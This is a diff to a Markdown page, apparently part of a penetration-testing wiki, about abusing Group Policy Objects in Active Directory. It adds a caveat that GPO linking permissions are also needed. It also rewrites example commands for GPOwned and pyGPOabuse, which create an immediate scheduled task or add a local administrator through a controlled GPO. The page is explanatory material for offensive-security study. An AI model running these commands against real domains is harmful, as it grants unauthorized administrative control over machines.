@@ -19,6 +19,9 @@ In certain scenarios, an attacker can gain control over GPOs. Some ACEs can give
 * `GenericAll`, `GenericWrite`, `WriteProperty` to any property (no GUID specified)
 * `WriteDacl`, `WriteOwner`
 
+> [!IMPORTANT] GPO linking is required
+> Controlling a GPO object is not sufficient on its own. The GPO must also be linked to an OU, site, or domain to affect computers/users. Creating or modifying GPO links requires `Write gpLink`, or Manage Group Policy Links permissions, on the target container (which is separate from control over the GPO object itself).
+
 ## Practice
 
 GPO-based attacks can be conducted with [New-GPOImmediateTask](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module), [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) (C#), or [pyGPOabuse](https://github.com/Hackndo/pyGPOAbuse) (python) and [GPOwned](https://github.com/X-C3LL/GPOwned) (Python) for UNIX-like systems.
@@ -35,10 +38,10 @@ From UNIX-like systems, a new immediate scheduled task can be created with [GPOw
 
 ```bash
 # GPOwned (buggy, not to use in production) - execute something (e.g. calc.exe)
-GPOwned -u 'user' -p 'password' -d 'domain' -dc-ip 'domaincontroller' -gpoimmtask -name '{12345677-ABCD-9876-ABCD-123456789012}' -author 'DOMAIN\Administrator' -taskname 'Some name' -taskdescription 'Some description' -dstpath 'c:\windows\system32\calc.exe'
+GPOwned -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip $DC_IP -gpoimmtask -name '{12345677-ABCD-9876-ABCD-123456789012}' -author "$DOMAIN\Administrator" -taskname 'Some name' -taskdescription 'Some description' -dstpath 'c:\windows\system32\calc.exe'
 
 # pyGPOabuse, update an existing GPO - add a local admin
-pygpoabuse 'domain'/'user':'password' -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
+pygpoabuse '$DOMAIN/$USER:$PASSWORD' -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
 ```
 
 
